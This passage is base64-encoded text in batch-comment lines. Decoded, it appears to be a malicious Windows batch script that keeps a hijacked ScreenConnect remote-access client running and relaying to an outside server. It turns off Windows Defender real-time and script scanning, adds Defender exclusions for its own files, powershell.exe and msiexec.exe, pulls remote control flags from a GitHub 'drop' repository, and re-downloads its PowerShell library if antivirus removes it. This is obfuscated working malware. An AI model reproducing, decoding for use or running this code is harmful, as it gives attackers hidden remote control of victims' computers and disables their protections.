::ZWFsLmxvZycgLVRhaWwgMTAiID4+IiVMT0clIiAyPiYxDQogICkNCiAgaWYgbm90
::IGRlZmluZWQgTVNJRVhJVCBzZXQgIk1TSUVYSVQ9ZmV0Y2gtZmFpbCINCiAgcG93
::ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9s
::aWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0
::ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAibXNpLWZh
::aWxlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRkFJTCAiTVNJIGluc3Rh
::bGwgZmFpbGVkIG9uIGFsbCBzb3VyY2VzIChtc2lleGVjIGV4aXQgJU1TSUVYSVQl
::KSINCikgZWxzZSAoDQogIGVjaG8gc3ZjIHJlc3RvcmVkPj4iJUxPRyUiDQogIHBv
::d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
::bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3Rh
::dGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlc3Rv
::cmVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBSRVNUT1JFRCAiU2NyZWVu
::Q29ubmVjdCByZWluc3RhbGxlZCBPSyINCikNCg0KOkFmdGVySGVhbA0KcmVtIE0x
::NjogQUxUIHByZXNlbnQtYnV0LXN0b3BwZWQgLT4gcmVzdGFydCwgdGhlbiByZXBh
::aXItYnktR1VJRCAoZXZlcnkgdGljaykNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
::IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVs
::IDEgKA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAl
::KSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIGVycm9ybGV2ZWwgMSAoDQog
::ICAgZWNobyBhbHQgc3RvcHBlZCAtIHJlc3RhcnQvcmVwYWlyPj4iJUxPRyUiDQog
::ICAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+
::bnVsIDI+JjENCiAgICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVB
::TFRfRlAlKSIgPm51bCAyPiYxDQogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5u
::dWwNCiAgICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAl
::KSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogICAgaWYgZXJyb3JsZXZlbCAxIGlm
::IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
::V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAt
::V29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAgKQ0KKQ0KcmVtIE0xNzog
::QUxUIHNlcnZpY2UgZW50cnkgZGVsZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVk
::IC0+IHJlcGFpci1ieS1HVUlEIGV2ZXJ5IHRpY2sNCnNjIHF1ZXJ5ICJTY3JlZW5D
::b25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2
::ZWwgMSAoDQogIGVjaG8gYWx0X21pc3NpbmdfdHJ5X3JlcGFpcj4+IiVMT0clIg0K
::ICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9m
::aWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
::ZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQ
::JSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQopDQpyZW0gKGV4dGVy
::bWluYXRpb24gYWxyZWFkeSByYW4gcHJlLWhlYWwgaW4gW0VdOyBmb3JlaWduIHN1
::cnZpdm9ycyBjb3VudGVkIHRoZXJlKQ0KDQpyZW0g4pSA4pSAIFtGXSBzdGVhbHRo
::IHJlLXNlY3VyZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gpIOKU
::gOKUgA0KcmVtIE0zOS9NNDM6IE1wUHJlZmVyZW5jZSB3aGVuIFdpbkRlZmVuZCBh
::bGl2ZTsgYWx3YXlzIGFsc28gd3JpdGUgcG9saWN5L2V4Y2x1c2lvbiBSRUcNCnJl
::bSAoSGVsbCBob3N0OiBXaW5EZWZlbmQgZGVhZCDihpIgMHg4MDAxMDZiYSwgYnV0
::IEFNU0kgc3RpbGwgYmxvY2tlZCBQUyDigJQgcmVnICsgb3duX2dyeXhhLmNtZCBj
::b3ZlciBpdCkNCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERp
::c2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51
::bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNh
::YmxlU2NyaXB0U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYx
::DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVu
::ZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2Qg
::MCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0
::XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVFVEwlIiAv
::dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRo
::cyIgL3YgIiVTeXN0ZW1Sb290JVxUZW1wXC51cGQiIC90IFJFR19EV09SRCAvZCAw
::IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRc
::V2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVByb2dyYW1G
::aWxlcyVcU2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAv
::ZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdp
::bmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQcm9ncmFtRmls
::ZXMoeDg2KSVcU2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2Qg
::MCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0
::XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92ICJTY3Jl
::ZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlIiAvdCBSRUdfRFdPUkQgL2QgMCAv
::ZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdp
::bmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92ICJtc2lleGVj
::LmV4ZSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpwb3dlcnNoZWxs
::IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
::YXNzIC1Db21tYW5kICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNv
::bnRpbnVlJzsgdHJ5e1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1v
::bml0b3JpbmcgJHRydWV9Y2F0Y2h7fTsgdHJ5e1NldC1NcFByZWZlcmVuY2UgLURp
::c2FibGVTY3JpcHRTY2FubmluZyAkdHJ1ZX1jYXRjaHt9OyB0cnl7QWRkLU1wUHJl
::ZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnJVdEJScsJyVFVEwlJywoSm9pbi1QYXRo
::ICRlbnY6UHJvZ3JhbUZpbGVzICdTY3JlZW5Db25uZWN0IENsaWVudConKSwoSm9p
::bi1QYXRoICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSAnU2NyZWVuQ29ubmVjdCBD
::bGllbnQqJykgLUVycm9yQWN0aW9uIFN0b3B9Y2F0Y2h7fTsgZm9yZWFjaCgkeCBp
::biBAKCdTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJywnU2NyZWVuQ29u
::bmVjdC5XaW5kb3dzQ2xpZW50LmV4ZScsJ21zaWV4ZWMuZXhlJywncG93ZXJzaGVs
::bC5leGUnKSl7dHJ5e0FkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3Mg
::JHggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWV9Y2F0Y2h7fX0iID5udWwg
::Mj4mMQ0KDQpyZW0g4pSA4pSAIFtHXSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBl
::dmVyeSB+MiBoIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJVdEJVxvd25f
::c2VjdXJlLmNtZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRoICclV0QlXHNlYy5m
::bGFnJykpIC1vciAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRo
::ICclV0QlXHNlYy5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2Ug
::MikpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCmlmIGVy
::cm9ybGV2ZWwgMSAoDQogIGVjaG8gcGVyaW9kaWMgcmUtc2VjdXJlPj4iJUxPRyUi
::DQogIGNhbGwgIiVXRCVcb3duX3NlY3VyZS5jbWQiID4+IiVMT0clIiAyPiYxDQog
::IGVjaG8gZG9uZT4iJVdEJVxzZWMuZmxhZyINCikNCg0KcmVtIOKUgOKUgCBbRzJd
::IEdyeXhhIE1VU1QtUlVOIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcmVtIE80MDog
::aWYgQU5ZIG5vbi1zZXZyeiBTQyBSdW5uaW5nIOKGkiBuZXZlciBtc2lleGVjIChz
::dG9wcyBwYW5lbCBkdXBsaWNhdGVzKS4NCnNldCAiR1JZWEFfT0s9MCINCnNldCAi
::R1JZWEFfV0FTPTAiDQpzZXQgIkRPX0RFRVA9MCINCnNldCAiRk9SQ0VfRz0wIg0K
::aWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vu
::cz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYg
::L0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCg0KcmVt
::IEZPUkNFIHB1c2g6IGNvbnRlbnQtaGFzaCB2aWEgZmMgL2IgKHJlLWZpcmUgd2hl
::biBmbGFnIGNvbnRlbnQgY2hhbmdlcyk7IHJhdy1maXJzdA0KIiVDVVJMJSIgLUwg
::LS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAy
::MCAtbyAiJVdEJVxmb3JjZV9ncnl4YS5uZXciICJodHRwczovL3Jhdy5naXRodWJ1
::c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9mb3JjZV9n
::cnl4YS5mbGFnP3Q9JVJBTkRPTSUlUkFORE9NJSIgPm51bCAyPiYxDQppZiBub3Qg
::ZXhpc3QgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5l
::Y3QtdGltZW91dCA2IC0tbWF4LXRpbWUgMjAgLW8gIiVXRCVcZm9yY2VfZ3J5eGEu
::bmV3IiAiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1
::Yi1kcm9wQG1haW4vZm9yY2VfZ3J5eGEuZmxhZz90PSVSQU5ET00lJVJBTkRPTSUi
::ID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAoDQog
::IGZpbmRzdHIgL0M6IlBVU0giICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIgPm51bCAy
::PiYxDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGlmIG5vdCBleGlzdCAi
::JVdEJVxmb3JjZV9ncnl4YS5kb25lIiAoDQogICAgICBzZXQgIkZPUkNFX0c9MSIN
::CiAgICApIGVsc2UgKA0KICAgICAgZmMgL2IgIiVXRCVcZm9yY2VfZ3J5eGEubmV3
::IiAiJVdEJVxmb3JjZV9ncnl4YS5kb25lIiA+bnVsIDI+JjENCiAgICAgIGlmIGVy
::cm9ybGV2ZWwgMSBzZXQgIkZPUkNFX0c9MSINCiAgICApDQogICkNCikNCg0KcmVt
::IERldGVjdCBhbnkgUnVubmluZyBub24tc2V2cnogU2NyZWVuQ29ubmVjdCAodHJ1
::ZSBHcnl4YSBwcmVzZW5jZSkNCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
::X2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEtaGVhbHRoIC1Xb3JrRGlyICIlV0QlIiA+
::IiVXRCVcZ3J5eGFfaGVhbHRoLm91dCIgMj5udWwNCnNldCAiR0g9Ig0KaWYgZXhp
::c3QgIiVXRCVcZ3J5eGFfaGVhbHRoLm91dCIgZm9yIC9mICJ1c2ViYWNrcSBkZWxp
::bXM9IiAlJVIgaW4gKCIlV0QlXGdyeXhhX2hlYWx0aC5vdXQiKSBkbyBzZXQgIkdI
::PSUlUiINCmVjaG8gZ3J5eGFfaGVhbHRoPSFHSCE+PiIlTE9HJSINCmVjaG8gIUdI
::IXwgZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWSIgPm51bA0KaWYgbm90IGVycm9y
::bGV2ZWwgMSAoDQogIHNldCAiR1JZWEFfT0s9MSINCiAgc2V0ICJHUllYQV9XQVM9
::MSINCiAgaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2tx
::IHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikg
::ZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCIN
::CikNCg0KcmVtIEZPUkNFIHB1c2g6IHF1ZXVlIEdyeXhhIFJFSU5TVEFMTCAocGFu
::ZWwgd2lwZSkgdGhlbiBhY2sg4oCUIGZyZWV6ZSBzdGlsbCBibG9ja3MgZGFpbHkg
::bXNpZXhlYw0KaWYgIiVGT1JDRV9HJSI9PSIxIiAoDQogIGVjaG8gZ3J5eGFfZm9y
::Y2VfcHVzaF9yZWluc3RhbGw+PiIlTE9HJSINCiAgY2FsbCA6UXVldWVHcnl4YUhl
::YWwgUkVJTlNUQUxMDQogIGlmIGV4aXN0ICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIg
::Y29weSAveSAiJVdEJVxmb3JjZV9ncnl4YS5uZXciICIlV0QlXGZvcmNlX2dyeXhh
::LmRvbmUiID5udWwgMj4mMQ0KICBnb3RvIDpHcnl4YUFmdGVyDQopDQoNCnBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKCgg
::LW5vdCAoVGVzdC1QYXRoICclR1JZWEFfREVFUCUnKSkgLW9yICgoKEdldC1EYXRl
::KS0oR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclR1JZWEFfREVFUCUnIC1Gb3JjZSku
::TGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgOCkpeyBleGl0IDEgfSBlbHNl
::IHsgZXhpdCAwIH0iID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIHNldCAiRE9f
::REVFUD0xIg0KDQpyZW0gSGVhbHRoeSArIG5vdCBkZWVwIGR1ZSDihpIgc3RpbGwg
::dmVyaWZ5IEltYWdlUGF0aCBoYXMgZ3J5eGEuY29tIChiYXJlIHNjIGNyZWF0ZSA9
::IGZhbHNlIGhlYWx0aHkpDQppZiAiIUdSWVhBX09LISI9PSIxIiAoDQogIHJlZyBx
::dWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiAvdiBJbWFnZVBhdGggMj5u
::dWwgfCBmaW5kc3RyIC9JICJncnl4YS5jb20iID5udWwNCiAgaWYgZXJyb3JsZXZl
::bCAxICgNCiAgICBzZXQgIkdSWVhBX09LPTAiDQogICAgZm9yIC9mICJ0b2tlbnM9
::MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58IGZp
::bmRzdHIgL0M6IlNFUlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykg
::ZG8gKA0KICAgICAgc2V0ICJfRlA9JSVhIg0KICAgICAgc2V0ICJfRlA9IV9GUDog
::PSEiDQogICAgICBpZiAvSSBub3QgIiFfRlAhIj09IiVLRUVQX0ZQJSIgaWYgL0kg
::bm90ICIhX0ZQISI9PSIlQUxUX0ZQJSIgKA0KICAgICAgICBzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5O
::SU5HIiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0KICAgICAgICBpZiBub3QgZXJy
::b3JsZXZlbCAxICgNCiAgICAgICAgICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1
::cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICgh
::X0ZQISkiIC92IEltYWdlUGF0aCAyPm51bCB8IGZpbmRzdHIgL0kgImdyeXhhLmNv
::bSIgPm51bA0KICAgICAgICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAg
::ICAgICAgc2V0ICJHUllYQV9PSz0xIg0KICAgICAgICAgICAgc2V0ICJHUllYQV9G
::UD0hX0ZQISINCiAgICAgICAgICApDQogICAgICAgICkNCiAgICAgICkNCiAgICAp
::DQogICAgaWYgIiFHUllYQV9PSyEiPT0iMCIgZWNobyBncnl4YV9ydW5uaW5nX25v
::X3JlbGF5Pj4iJUxPRyUiDQogICkNCikNCg0KaWYgIiFHUllYQV9PSyEiPT0iMSIg
::aWYgIiVET19ERUVQJSI9PSIwIiAoDQogIGVjaG8gZ3J5eGFfc2tpcF9hbHJlYWR5
::X2hlYWx0aHk+PiIlTE9HJSINCiAgZ290byA6R3J5eGFBZnRlcg0KKQ0KDQpyZW0g
::cmVzdG9yZSBsaWIgaWYgQVYvQU1TSSBkZWxldGVkIGl0IChjbWQtb25seSkNCmlm
::IG5vdCBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBlY2hvIGdyeXhhX2xp
::Yl9taXNzaW5nX3JlZmV0Y2g+PiIlTE9HJSINCiAgcmVnIGFkZCAiSEtMTVxTT0ZU
::V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRp
::bWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5uaW5nIC90IFJFR19E
::V09SRCAvZCAxIC9mID5udWwgMj4mMQ0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJF
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92
::ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCiAgIiVDVVJM
::JSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgt
::dGltZSA0MCAtbyAiJVdEJVxvd25fbGliLnBzMSIgIiVPV05MSUIlIiA+bnVsIDI+
::JjENCikNCg0KcmVtIE01MiBGUkVFWkUgKyBTVFVDSy1IRUFMOiBzdGFydC1vbmx5
::IHdoZW4gcG9zc2libGU7IHF1ZXVlIEc3IGhlYWwgd2hlbiAxMDYwK2RpciBvciBu
::by1yZWxheQ0KaWYgZXhpc3QgIiVXRCVcZ3J5eGFfaW5zdGFsbC5jbWQiIGRlbCAv
::ZiAvcSAiJVdEJVxncnl4YV9pbnN0YWxsLmNtZCIgPm51bCAyPiYxDQppZiBleGlz
::dCAiJVdEJVxncnl4YV9tc2kubG9jayIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoKEdldC1EYXRlKS0oR2V0
::LUl0ZW0gJyVXRCVcZ3J5eGFfbXNpLmxvY2snKS5MYXN0V3JpdGVUaW1lKS5Ub3Rh
::bE1pbnV0ZXMgLWd0IDI1KXtSZW1vdmUtSXRlbSAnJVdEJVxncnl4YV9tc2kubG9j
::aycgLUZvcmNlfSIgPm51bCAyPiYxDQopDQppZiAiIUdSWVhBX09LISI9PSIwIiAo
::DQogIGVjaG8gZ3J5eGFfbW9uX3N0YXJ0X29ubHk+PiIlTE9HJSINCiAgc2MgY29u
::ZmlnICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHN0YXJ0PSBh
::dXRvID5udWwgMj4mMQ0KICBzYyBmYWlsdXJlICJTY3JlZW5Db25uZWN0IENsaWVu
::dCAoJUdSWVhBX0ZQJSkiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMw
::MDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCA+bnVsIDI+JjENCiAgc2Mgc3Rh
::cnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYx
::DQogIHRpbWVvdXQgL3QgMTIgL25vYnJlYWsgPm51bA0KICBzYyBzdGFydCAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgdGlt
::ZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5H
::IiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAx
::ICgNCiAgICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0
::XFNlcnZpY2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgL3Yg
::SW1hZ2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQog
::ICAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQogICkNCiAg
::cmVtIE01Mzogc2VydmljZSBleGlzdHMgU1RPUFBFRCB3aXRoIHJlbGF5IOKGkiBz
::dGFydC1vbmx5LCBkbyBOT1QgcmVpbnN0YWxsDQogIGlmICIhR1JZWEFfT0shIj09
::IjAiICgNCiAgICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllY
::QV9GUCUpIiA+bnVsIDI+JjENCiAgICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAg
::ICAgIHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2Vy
::dmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiAvdiBJbWFn
::ZVBhdGggMj5udWwgfCBmaW5kc3RyIC9JICJncnl4YS5jb20iID5udWwNCiAgICAg
::IGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICBlY2hvIGdyeXhhX3N0b3Bw
::ZWRfcmVsYXlfc3RhcnRfcmV0cnk+PiIlTE9HJSINCiAgICAgICAgc2Mgc3RhcnQg
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQog
::ICAgICAgIHRpbWVvdXQgL3QgMTAgL25vYnJlYWsgPm51bA0KICAgICAgICBzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmRz
::dHIgL0kgL0M6IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiA+bnVsDQogICAg
::ICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KICAgICAg
::ICBpZiAiIUdSWVhBX09LISI9PSIwIiBlY2hvIGdyeXhhX3N0b3BwZWRfcmVsYXlf
::c3RpbGxfZG93bl9ub19oZWFsPj4iJUxPRyUiDQogICAgICApDQogICAgKQ0KICAp
::DQogIGlmICIhR1JZWEFfT0shIj09IjAiICgNCiAgICBmb3IgL2YgInRva2Vucz0y
::IGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmlu
::ZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBk
::byAoDQogICAgICBzZXQgIl9GUD0lJWEiDQogICAgICBzZXQgIl9GUD0hX0ZQOiA9
::ISINCiAgICAgIGlmIC9JIG5vdCAiIV9GUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBu
::b3QgIiFfRlAhIj09IiVBTFRfRlAlIiAoDQogICAgICAgIHNjIHF1ZXJ5ICJTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoIV9GUCEpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5J
::TkciIC9DOiJTVEFSVF9QRU5ESU5HIiA+bnVsDQogICAgICAgIGlmIG5vdCBlcnJv
::cmxldmVsIDEgKA0KICAgICAgICAgIHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3Vy
::cmVudENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFf
::RlAhKSIgL3YgSW1hZ2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29t
::IiA+bnVsDQogICAgICAgICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAg
::ICAgICBzZXQgIkdSWVhBX09LPTEiDQogICAgICAgICAgICBzZXQgIkdSWVhBX0ZQ
::PSFfRlAhIg0KICAgICAgICAgICkNCiAgICAgICAgKQ0KICAgICAgKQ0KICAgICkN
::CiAgKQ0KKQ0KDQpyZW0gaGVhbCBPTkxZIHdoZW4gc2VydmljZSBtaXNzaW5nICgx
::MDYwKS4gTmV2ZXIgcmVpbnN0YWxsIG92ZXIgU1RPUFBFRCtyZWxheS4NCnNldCAi
::TkVFRF9IRUFMPTAiDQppZiAiIUdSWVhBX09LISI9PSIwIiAoDQogIHNjIHF1ZXJ5
::ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0K
